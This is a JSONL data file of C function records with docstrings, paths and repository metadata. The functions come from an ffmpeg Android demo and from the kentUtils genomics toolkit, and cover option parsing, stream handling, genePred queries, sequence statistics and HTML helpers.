{"docstring": "/**\n * Parse a metadata specifier passed as 'arg' parameter.\n * @param arg  metadata string to parse\n * @param type metadata type is written here -- g(lobal)/s(tream)/c(hapter)/p(rogram)\n * @param index for type c/p, chapter/program index is written here\n * @param stream_spec for type s, the stream specifier is written here\n */\n", "func_signal": "static void parse_meta_type(char *arg, char *type, int *index, const char **stream_spec)", "code": "{\n    if (*arg) {\n        *type = *arg;\n        switch (*arg) {\n        case 'g':\n            break;\n        case 's':\n            if (*(++arg) && *arg != ':') {\n                av_log(NULL, AV_LOG_FATAL, \"Invalid metadata specifier %s.\\n\", arg);\n                exit_program(1);\n            }\n            *stream_spec = *arg == ':' ? arg + 1 : \"\";\n            break;\n        case 'c':\n        case 'p':\n            if (*(++arg) == ':')\n                *index = strtol(++arg, NULL, 0);\n            break;\n        default:\n            av_log(NULL, AV_LOG_FATAL, \"Invalid metadata type %c.\\n\", *arg);\n            exit_program(1);\n        }\n    } else\n        *type = 'g';\n}", "path": "app\\src\\main\\jni\\ffmpeg_opt.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/**\n * Select the output stream to process.\n *\n * @return  selected output stream, or NULL if none available\n */\n", "func_signal": "static OutputStream *choose_output(void)", "code": "{\n    int i;\n    int64_t opts_min = INT64_MAX;\n    OutputStream *ost_min = NULL;\n\n    for (i = 0; i < nb_output_streams; i++) {\n        OutputStream *ost = output_streams[i];\n        int64_t opts = ost->st->cur_dts == AV_NOPTS_VALUE ? INT64_MIN :\n                       av_rescale_q(ost->st->cur_dts, ost->st->time_base,\n                                    AV_TIME_BASE_Q);\n        if (ost->st->cur_dts == AV_NOPTS_VALUE)\n            av_log(NULL, AV_LOG_DEBUG, \"cur_dts is invalid (this is harmless if it occurs once at the start per stream)\\n\");\n\n        if (!ost->finished && opts < opts_min) {\n            opts_min = opts;\n            ost_min  = ost->unavailable ? NULL : ost;\n        }\n    }\n    return ost_min;\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/*\n * Check whether a packet from ist should be written into ost at this time\n */\n", "func_signal": "static int check_output_constraints(InputStream *ist, OutputStream *ost)", "code": "{\n    OutputFile *of = output_files[ost->file_index];\n    int ist_index  = input_files[ist->file_index]->ist_index + ist->st->index;\n\n    if (ost->source_index != ist_index)\n        return 0;\n\n    if (ost->finished)\n        return 0;\n\n    if (of->start_time != AV_NOPTS_VALUE && ist->pts < of->start_time)\n        return 0;\n\n    return 1;\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/*\n * Finish parsing an option group.\n *\n * @param group_idx which group definition should this group belong to\n * @param arg argument of the group delimiting option\n */\n", "func_signal": "static void finish_group(OptionParseContext *octx, int group_idx,\n                         const char *arg)", "code": "{\n    OptionGroupList *l = &octx->groups[group_idx];\n    OptionGroup *g;\n\n    GROW_ARRAY(l->groups, l->nb_groups);\n    g = &l->groups[l->nb_groups - 1];\n\n    *g             = octx->cur_group;\n    g->arg         = arg;\n    g->group_def   = l->group_def;\n    g->sws_dict    = sws_dict;\n    g->swr_opts    = swr_opts;\n    g->codec_opts  = codec_opts;\n    g->format_opts = format_opts;\n    g->resample_opts = resample_opts;\n\n    codec_opts  = NULL;\n    format_opts = NULL;\n    resample_opts = NULL;\n    sws_dict    = NULL;\n    swr_opts    = NULL;\n    init_opts();\n\n    memset(&octx->cur_group, 0, sizeof(octx->cur_group));\n}", "path": "app\\src\\main\\jni\\cmdutils.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/**\n * Prepare command line arguments for executable.\n * For Windows - perform wide-char to UTF-8 conversion.\n * Input arguments should be main() function arguments.\n * @param argc_ptr Arguments number (including executable)\n * @param argv_ptr Arguments list.\n */\n", "func_signal": "static void prepare_app_arguments(int *argc_ptr, char ***argv_ptr)", "code": "{\n    char *argstr_flat;\n    wchar_t **argv_w;\n    int i, buffsize = 0, offset = 0;\n\n    if (win32_argv_utf8) {\n        *argc_ptr = win32_argc;\n        *argv_ptr = win32_argv_utf8;\n        return;\n    }\n\n    win32_argc = 0;\n    argv_w = CommandLineToArgvW(GetCommandLineW(), &win32_argc);\n    if (win32_argc <= 0 || !argv_w)\n        return;\n\n    /* determine the UTF-8 buffer size (including NULL-termination symbols) */\n    for (i = 0; i < win32_argc; i++)\n        buffsize += WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1,\n                                        NULL, 0, NULL, NULL);\n\n    win32_argv_utf8 = av_mallocz(sizeof(char *) * (win32_argc + 1) + buffsize);\n    argstr_flat     = (char *)win32_argv_utf8 + sizeof(char *) * (win32_argc + 1);\n    if (!win32_argv_utf8) {\n        LocalFree(argv_w);\n        return;\n    }\n\n    for (i = 0; i < win32_argc; i++) {\n        win32_argv_utf8[i] = &argstr_flat[offset];\n        offset += WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1,\n                                      &argstr_flat[offset],\n                                      buffsize - offset, NULL, NULL);\n    }\n    win32_argv_utf8[i] = NULL;\n    LocalFree(argv_w);\n\n    *argc_ptr = win32_argc;\n    *argv_ptr = win32_argv_utf8;\n}", "path": "app\\src\\main\\jni\\cmdutils.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/*------------------------------------------------------*/\n", "func_signal": "int main (int argc, char **argv)", "code": "{ \n  \n  char *seq, *seqname, *desc ;\n  \n  int length ;\n  int i ;\n  static FILE *fil ;\n\n  /*------------------------------------------------------*/  \n  switch ( argc )\n    {\n    default: if (argc != 2)\n      usage () ;\n    }\n     if (!(seqname = malloc (MAXNAMELEN+1)))\n     { fprintf (stderr, \"Couldn't malloc %d bytes\", MAXNAMELEN) ;\n     exit (-1) ;\n     }\n     \n     if (!(seq = malloc (MALLOCBLOCK+1)))\n       { fprintf (stderr, \"Couldn't malloc %d bytes\", MALLOCBLOCK) ;\n\t exit (-1) ;\n       }\n\n  if (!(fil = fopen ( argv[1], \"r\" ))) \n    usage ();\n  \n  while ( readSequence(fil, dna2textConv, &seq, &seqname, &desc, &length) ) \n    /* once through per sequence */\n    { \n      i = 0 ;\n      while ( seqname[i] != ' ' && seqname[i] != '\\0' && i < 256 )\n\t++i ;\n      seqname[i] = '\\0' ;\n\n      findspans ( 0, length, seq, seqname ) ;\n    }\n\n  exit (0);\n}", "path": "src\\utils\\cpgIslandExt\\cpg_lh.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* Return how long the named file is in bytes. \n * Return -1 if no such file. */\n", "func_signal": "off_t fileSize(char *fileName)", "code": "{\nint fd;\nlong size;\nfd = _open(fileName, _O_RDONLY, 0);\nif (fd < 0)\n    return -1;\nsize = _lseek(fd, 0L, SEEK_END);\n_close(fd);\nreturn size;\n}", "path": "src\\lib\\oswin9x.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* read a list of single words from a file */\n", "func_signal": "static struct slName *readList(char *fileName)", "code": "{\nstruct lineFile *lf = lineFileOpen(fileName, TRUE);\nstruct slName *list = NULL;\nchar *row[1];\n\nwhile (lineFileRow(lf, row))\n    {\n    int len = strlen(row[0]);\n    struct slName *sn = needMem(sizeof(*sn)+len);\n    strcpy(sn->name, row[0]);\n    slAddHead(&list, sn);\n    }\n\nslReverse(&list);\n\nlineFileClose(&lf);\nreturn list;\n}", "path": "src\\hg\\ratStuff\\mafGene\\mafGene.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* load one or more genePreds from the database */\n", "func_signal": "struct genePred *getPredsForName(char *name, char *geneTable, char *db)", "code": "{\nstruct sqlConnection *conn = hAllocConn(db);\nstruct genePred *list = NULL;\nchar splitTable[HDB_MAX_TABLE_STRING];\nstruct genePred *gene;\nboolean hasBin;\nstruct genePredReader *reader;\n\nboolean found =  hFindSplitTable(db, NULL, geneTable,\n\tsplitTable, &hasBin);\n\nif (!found)\n    errAbort(\"can't find table %s\\n\", geneTable);\n\nchar extra[2048];\nif (onlyChrom != NULL)\n    safef(extra, sizeof extra, \"name='%s' and chrom='%s'\", name, onlyChrom);\nelse\n    safef(extra, sizeof extra, \"name='%s'\", name);\n\nreader = genePredReaderQuery( conn, splitTable, extra);\n\nwhile ((gene  = genePredReaderNext(reader)) != NULL)\n    {\n    verbose(2, \"got gene %s\\n\",gene->name);\n    slAddHead(&list, gene);\n    }\n\nif (list == NULL)\n    errAbort(\"no genePred for gene %s in %s\\n\",name, geneTable);\n\nslReverse(&list);\n\ngenePredReaderFree(&reader);\nhFreeConn(&conn);\n\nreturn list;\n}", "path": "src\\hg\\ratStuff\\mafGene\\mafGene.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* get the largest radius from the given array of background points */\n", "func_signal": "long getMaxRadius(bgPoint* backgroundData, long numberOfWindows)", "code": "{\n    long maxRadius = 0;\n\n    long i;\n\n    for(i = 0; i < numberOfWindows; i++) {\n        if(backgroundData[i].radius > maxRadius)\n            maxRadius = backgroundData[i].radius;\n    }\n\n    return maxRadius;\n}", "path": "src\\hg\\semiNorm\\semiNorm.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/*use this program even though it is obsolete*/\n", "func_signal": "static void usage()", "code": "{\nerrAbort(\n    \"wigZoom - process wiggle data to a zoomed view\\n\"\n    \"usage: wigZoom [-verbose=2] [-dataSpan=N] <file names>\\n\"\n    \"\\t-dataSpan=N - # of bases spanned for each data point, default 1024\\n\"\n    \"\\t-obsolete - Use this program even though it is obsolete.\\n\"\n    \"\\t-verbose=2 - display process while underway\\n\"\n    \"\\t<file names> - list of files to process\\n\"\n    \"Each ascii file is a two column file.  Whitespace separator\\n\"\n    \"First column of data is a chromosome location (IN NUMERICAL ORDER !).\\n\"\n    \"Second column is data value for that location, any real data value allowed.\"\n);\n}", "path": "src\\utils\\wigAsciiToBinary\\wigZoom.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* counts the number of non-gap bases in a seq */\n", "func_signal": "int ungappedSize(struct dnaSeq * seq)", "code": "{\n    int size = 0;\n    char *c = seq->dna;\n    while(*c != '\\0') {\n        if(*c != '-')\n            size++;\n        ++c;\n    }\n\n    return size;\n}", "path": "src\\hg\\mouseStuff\\xmfaToMaf\\xmfaToMaf.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* finds the smallest point between the first and last iterators whoes position \n * is grather than or equal to position */\n", "func_signal": "bgPoint* findUpperBound(long position, bgPoint* first, long length)", "code": "{\n    int half;\n    bgPoint* middle;\n\n    while(length > 0) {\n        half = length / 2;\n        middle = first + half;\n\n        if(middle->position < position) {\n            first = middle + 1;\n            length = length - half - 1;\n        } else {\n            length = half;\n        }\n    }\n\n    return first;\n}", "path": "src\\hg\\semiNorm\\semiNorm.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* print a simple usage message */\n", "func_signal": "void usage(char* programName)", "code": "{\n    char dir[256];\n    char name[128];\n    char extension[64];\n    \n    splitPath(programName, dir, name, extension);\n    fprintf(stderr, \"usage: %s backgroundFile windowsFile defaultBackgroundSize defaultBackgroundPercentID [semi]\\n\", name);\n}", "path": "src\\hg\\semiNorm\\semiNorm.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* Include an HTML file in a CGI */\n", "func_signal": "void htmlIncludeFile(char *path)", "code": "{\nchar *str = NULL;\nsize_t len = 0;\n\nif (path == NULL)\n    errAbort(\"Program error: including null file\");\nif (!fileExists(path))\n    errAbort(\"Missing file %s\", path);\nreadInGulp(path, &str, &len);\n\nif (len <= 0)\n    errAbort(\"Error reading included file: %s\", path);\n\nputs(str);\nfreeMem(str);\n}", "path": "src\\lib\\htmshell.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* find and return the score of the window in the backgroundData that encloses\n * and is nearest to position */\n", "func_signal": "bgPoint* getNearestEnclosing(long position, bgPoint* backgroundData, long numberOfWindows,\n        long maxRadius)", "code": "{\n\n    bgPoint* current;\n    long minDistance = LONG_MAX;\n    bgPoint* minWindow = 0;\n\n    current = findUpperBound(position + maxRadius, backgroundData, numberOfWindows);\n\n    while(current->position >= position - maxRadius && current >= backgroundData) {\n        /* if the current window contains the point */\n        if(current->position - current->radius <= position &&\n                position <= current->position + current->radius) {\n\n            /* check to see if it is closer than the current minimum */\n            if(labs(current->position - position) < minDistance) {\n                minDistance = labs(current->position - position);\n                minWindow = current;\n            }\n        }\n\n        --current;\n    }\n\n    return minWindow;\n}", "path": "src\\hg\\semiNorm\\semiNorm.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* output the sequence for one gene for every species to \n * the file stream \n */\n", "func_signal": "void outGenePred(FILE *f, struct genePred *pred, char *dbName, \n    char *mafTable, char *geneTable, struct slName *speciesNameList)", "code": "{\nunsigned options = 0;\n\nif (inExons)\n    options |= MAFGENE_EXONS;\nif (noTrans)\n    options |= MAFGENE_NOTRANS;\nif (!noDash)\n    options |= MAFGENE_OUTBLANK;\nif (includeUtr)\n    options |= MAFGENE_INCLUDEUTR;\n\nmafGeneOutPred(f, pred, dbName, mafTable, speciesNameList, options, 0);\n}", "path": "src\\hg\\ratStuff\\mafGene\\mafGene.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* Wrap an html file around the passed in function.\n * The passed in function is already in the body. It\n * should just make paragraphs and return.\n */\n", "func_signal": "void htmShell(char *title, void (*doMiddle)(), char *method)", "code": "{\n/* Preamble. */\ndnaUtilOpen();\nhtmlStart(title);\n\n/* Call wrapper for error handling. */\nhtmEmptyShell(doMiddle, method);\n\n/* Post-script. */\nhtmlEnd();\n}", "path": "src\\lib\\htmshell.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* Include an HTML file in a CGI.\n *   The file path is relative to the web server document root */\n", "func_signal": "void htmlIncludeWebFile(char *file)", "code": "{\nchar path[256];\nchar *docRoot = \"/usr/local/apache/htdocs\";\n\nsafef(path, sizeof path, \"%s/%s\", docRoot, file);\nhtmlIncludeFile(path);\n}", "path": "src\\lib\\htmshell.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* ASH 3/23/04: Return separate counts of G's and C's for expected val calc. */\n", "func_signal": "void getstats ( int start, int end, char *seq, char *seqname, int *ncpg, int *ngpc, int *ng, int *nc )", "code": "{\n\nint i ;\n*ncpg = *ngpc = *ng = *nc = 0 ;\n\nfor ( i = start ; i < end ; ++i ) \n  {\n   if ( end-1-i && seq[i]=='C' && seq[i+1]=='G' ) ++*ncpg ; \n   if ( end-1-i && seq[i]=='G' && seq[i+1]=='C' ) ++*ngpc ; \n   if ( seq[i]=='G' ) ++*ng ; \n   if ( seq[i]=='C' ) ++*nc ; \n  }\n}", "path": "src\\utils\\cpgIslandExt\\cpg_lh.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* entry */\n", "func_signal": "int main(int argc, char** argv)", "code": "{\nchar *selectFile, *inFile, *outFile, *dropFile;\noptionInit(&argc, argv, optionSpecs);\nif (argc != 4)\n    usage(\"wrong # args\");\nselectFile = argv[1];\ninFile = argv[2];\noutFile = argv[3];\n\n/* select file options */\nif (optionExists(\"selectFmt\") && optionExists(\"selectCoordCols\"))\n    errAbort(\"can't specify both -selectFmt and -selectCoordCols\");\n\nif (optionExists(\"selectFmt\"))\n    selectFmt = parseFormatSpec(optionVal(\"selectFmt\", NULL));\nelse if (optionExists(\"selectCoordCols\"))\n    {\n    selectCoordCols = coordColsParseSpec(\"selectCoordCols\",\n                                         optionVal(\"selectCoordCols\", NULL));\n    selectFmt = COORD_COLS_FMT;\n    }\nelse\n    selectFmt = getFileFormat(selectFile);\n\nif (optionExists(\"selectCds\"))\n    selectCaOpts |= chromAnnCds;\nif (optionExists(\"selectRange\"))\n    selectCaOpts |= chromAnnRange;\nif ((selectFmt == PSLQ_FMT) || (selectFmt == CHAINQ_FMT))\n    selectCaOpts |= chromAnnUseQSide;\n\n/* in file options */\nif (optionExists(\"inFmt\") && optionExists(\"inCoordCols\"))\n    errAbort(\"can't specify both -inFmt and -inCoordCols\");\nif (optionExists(\"inFmt\"))\n    inFmt = parseFormatSpec(optionVal(\"inFmt\", NULL));\nelse if (optionExists(\"inCoordCols\"))\n    {\n    inCoordCols = coordColsParseSpec(\"inCoordCols\",\n                                     optionVal(\"inCoordCols\", NULL));\n    inFmt = COORD_COLS_FMT;\n    }\nelse\n    inFmt = getFileFormat(inFile);\n\ninCaOpts = chromAnnSaveLines; // need lines for output\nif (optionExists(\"inCds\"))\n    inCaOpts |= chromAnnCds;\nif (optionExists(\"inRange\"))\n    inCaOpts |= chromAnnRange;\nif ((inFmt == PSLQ_FMT) || (inFmt == CHAINQ_FMT))\n    inCaOpts |= chromAnnUseQSide;\n\n/* select options */\nuseAggregate = optionExists(\"aggregate\");\nnonOverlapping = optionExists(\"nonOverlapping\");\nif (optionExists(\"strand\") && optionExists(\"oppositeStrand\"))\n    errAbort(\"can only specify one of -strand and -oppositeStrand\");\nif (optionExists(\"strand\"))\n    selectOpts |= selStrand;\nif (optionExists(\"oppositeStrand\"))\n    selectOpts |= selOppositeStrand;\nif (optionExists(\"excludeSelf\") && (optionExists(\"idMatch\")))\n    errAbort(\"can't specify both -excludeSelf and -idMatch\");\nif (optionExists(\"excludeSelf\"))\n    selectOpts |= selExcludeSelf;\nif (optionExists(\"idMatch\"))\n    selectOpts |= selIdMatch;\n\ncriteria.threshold = optionFloat(\"overlapThreshold\", 0.0);\ncriteria.thresholdCeil = optionFloat(\"overlapThresholdCeil\", 1.1);\ncriteria.similarity = optionFloat(\"overlapSimilarity\", 0.0);\ncriteria.similarityCeil = optionFloat(\"overlapSimilarityCeil\", 1.1);\ncriteria.bases = optionInt(\"overlapBases\", -1);\n\n/* output options */\nmergeOutput = optionExists(\"mergeOutput\");\nidOutput = optionExists(\"idOutput\");\nstatsOutput = optionExists(\"statsOutput\") || optionExists(\"statsOutputAll\") || optionExists(\"statsOutputBoth\");\nif ((mergeOutput + idOutput + statsOutput) > 1)\n    errAbort(\"can only specify one of -mergeOutput, -idOutput, -statsOutput, -statsOutputAll, or -statsOutputBoth\");\noutputAll = optionExists(\"statsOutputAll\");\noutputBoth = optionExists(\"statsOutputBoth\");\nif (outputBoth)\n    outputAll = TRUE;\nif (mergeOutput)\n    {\n    if (nonOverlapping)\n        errAbort(\"can't use -mergeOutput with -nonOverlapping\");\n    if (useAggregate)\n        errAbort(\"can't use -mergeOutput with -aggregate\");\n    if ((selectFmt == CHAIN_FMT) || (selectFmt == CHAINQ_FMT)\n        || (inFmt == CHAIN_FMT) || (inFmt == CHAINQ_FMT))\n    if (useAggregate)\n        errAbort(\"can't use -mergeOutput with chains\");\n    selectCaOpts |= chromAnnSaveLines;\n    }\ndropFile = optionVal(\"dropped\", NULL);\n\n/* check for options incompatible with aggregate mode */\nif (useAggregate)\n    {\n    int i;\n    for (i = 0; aggIncompatible[i] != NULL; i++)\n        {\n        if (optionExists(aggIncompatible[i]))\n            errAbort(\"-%s is not allowed -aggregate\", aggIncompatible[i]);\n        }\n    }\n\noverlapSelect(selectFile, inFile, outFile, dropFile);\nreturn 0;\n}", "path": "src\\hg\\utils\\overlapSelect\\overlapSelect.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* query the list of gene names from the frames table */\n", "func_signal": "static struct genePred *queryPreds(char *dbName, char *geneTable)", "code": "{\nstruct sqlConnection *conn = hAllocConn(dbName);\nstruct genePred *list = NULL;\nchar buf[2048];\nchar *extra = NULL;\nstruct genePredReader *reader;\n\nif (onlyChrom != NULL)\n    {\n    safef(buf, sizeof buf, \"chrom='%s'\", onlyChrom);\n    extra = buf;\n    }\n\nreader = genePredReaderQuery( conn, geneTable, extra);\n\nlist = genePredReaderAll(reader);\n\nhFreeConn(&conn);\n\nreturn list;\n}", "path": "src\\hg\\ratStuff\\mafGene\\mafGene.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/*\tsettings string is a set of lines\n *\tthe lines need to be output as name='value'\n *\tpairs all on a single line\n */\n", "func_signal": "static void saveSettings(FILE *f, char *settings)", "code": "{\nstruct lineFile *lf;\nchar *line;\n\nlf = lineFileOnString(\"settings\", TRUE, settings);\nwhile (lineFileNext(lf, &line, NULL))\n    {\n    if (line[0] != '\\0')\n\t{\n\tchar *blank;\n\tblank = strchr(line, ' ');\n\tif (blank != (char *)NULL)\n\t    {\n\t    int nameLen = blank - line;\n\t    char name[256];\n\n\t    nameLen = (nameLen < 256) ? nameLen : 255;\n\t    strncpy(name, line, nameLen);\n\t    name[nameLen] = '\\0';\n\t    fprintf(f, \"\\t%s='%s'\", name, makeEscapedString(blank+1, '\\''));\n\t    }\n\telse\n\t    fprintf(f, \"\\t%s\", line);\n\t}\n    }\nlineFileClose(&lf);\n}", "path": "src\\hg\\lib\\customTrack.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* Wrap an html file around the passed in function.\n * The passed in function is already in the body. It\n * should just make paragraphs and return.\n * Method should be \"query\" or \"get\" or \"post\".\nparam title - The HTML page title\nparam head - The head text: can be a refresh directive or javascript\nparam method - The function pointer to execute in the middle\nparam method - The browser request method to use\n */\n", "func_signal": "void htmShellWithHead( char *title, char *head, void (*doMiddle)(), char *method)", "code": "{\n/* Preamble. */\ndnaUtilOpen();\n\nputs(\"Content-Type:text/html\");\nputs(\"\\n\");\n\nputs(\"<HTML>\");\nprintf(\"<HEAD>%s<TITLE>%s</TITLE>\\n</HEAD>\\n\\n\", head, title);\nprintBodyTag(stdout);\n\nhtmlWarnBoxSetup(stdout);// Sets up a warning box which can be filled with errors as they occur\n\n/* Call wrapper for error handling. */\nhtmEmptyShell(doMiddle, method);\n\n/* Post-script. */\nhtmlEnd();\n}", "path": "src\\lib\\htmshell.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
{"docstring": "/* load the background from the given filename and put the numnber of windows\n * at the given address */\n", "func_signal": "bgPoint* loadBackground(char* filename, long* numberOfWindows)", "code": "{\n    char chrom[16];\n    char c[16];\n    long chromStart;\n    long chromEnd;\n    long number;\n    long AA;\n    long AC;\n    long AG;\n    long AT;\n    long CA;\n    long CC;\n    long CG;\n    long CT;\n    long GA;\n    long GC;\n    long GG;\n    long GT;\n    long TA;\n    long TC;\n    long TG;\n    long TT;\n\n    FILE* backgroundFile;\n    bgPoint* backgroundData = 0;\n    long i;\n\n    *numberOfWindows = 0;\n    backgroundFile = mustOpen(filename, \"r\");\n\n    /* see if the first character is a # */\n    *c = fgetc(backgroundFile);\n    if(*c == '#') {\n        /* read the rest of the line */\n        while(fgetc(backgroundFile) != '\\n')\n            ;\n    } else\n        ungetc(*c, backgroundFile);\n        \n    /* count now many windows there are */\n    while(!feof(backgroundFile)) {\n        if(fscanf(backgroundFile, \"%15s\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t\"\n                                  \"%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\",\n                c, &chromStart, &chromEnd, &number, \n                &AA, &AC, &AG, &AT, &CA, &CC, &CG, &CT,\n                &GA, &GC, &GG, &GT, &TA, &TC, &TG, &TT) == 20)\n            (*numberOfWindows)++;\n    }\n    \n    /* add two to account for the end and begin sentries */\n    (*numberOfWindows) += 2;\n\n    backgroundData = needLargeMem((*numberOfWindows) * sizeof(bgPoint));\n    \n    /* now read the data starting from the begining of the file */\n    rewind(backgroundFile); \n\n    /* see if the first character is a # */\n    *c = fgetc(backgroundFile);\n    if(*c == '#') {\n        /* read the rest of the line */\n        while(fgetc(backgroundFile) != '\\n')\n            ;\n    } else\n        ungetc(*c, backgroundFile);\n    \n    /* added a begin of list sentry */\n    backgroundData[0].position = -1;\n    backgroundData[0].score = -1;\n    backgroundData[0].number = -1;\n    backgroundData[0].radius = -1;\n\n    /* read the first data file, and store the chrom to make sure that they\n     * are the same for all windows */\n    assert(fscanf(backgroundFile, \"%15s\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t\"\n                                  \"%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\",\n                chrom, &chromStart, &chromEnd, &number, \n                &AA, &AC, &AG, &AT, &CA, &CC, &CG, &CT,\n                &GA, &GC, &GG, &GT, &TA, &TC, &TG, &TT) == 20);\n    backgroundData[1].position = (chromStart + chromEnd) / 2;\n    backgroundData[1].score = (((double)AA) + CC + GG +TT) /\n        (((double)AA) + AC + AG + AT + CA + CC + CG + CT + GA + GC + GG + GT + TA + TC + TG + TT);\n    backgroundData[1].number = number;\n    backgroundData[1].radius = (chromEnd - chromStart) / 2;\n\n    for(i = 2; i < *numberOfWindows - 1; i++) {\n        assert(fscanf(backgroundFile, \"%15s\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t\"\n                               \"%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\\t%ld\",\n                c, &chromStart, &chromEnd, &number, \n                &AA, &AC, &AG, &AT, &CA, &CC, &CG, &CT,\n                &GA, &GC, &GG, &GT, &TA, &TC, &TG, &TT) == 20);\n\n        /* make sure that all the windows are on the smae chrom */\n        if(!sameString(chrom, c))\n            errAbort(\"all window do not come from the same chromosome \"\n                    \"in file %s\\n\", filename);\n\n        backgroundData[i].position = (chromStart + chromEnd) / 2;\n        backgroundData[i].score = (((double)AA) + CC + GG +TT) /\n            (((double)AA) + AC + AG + AT + CA + CC + CG + CT + GA + GC + GG + GT + TA + TC + TG + TT);\n        backgroundData[i].number = number;\n        backgroundData[i].radius = (chromEnd - chromStart) / 2;\n    }\n\n    /* added an end of list sentry */\n    backgroundData[i].position = LONG_MAX;\n    backgroundData[i].score = -1;\n    backgroundData[i].number = -1;\n    backgroundData[i].radius = -1;\n    \n    fclose(backgroundFile);\n\n    return backgroundData;\n}", "path": "src\\hg\\semiNorm\\semiNorm.c", "repo_name": "ENCODE-DCC/kentUtils", "stars": 148, "license": "None", "language": "c", "size": 225684}
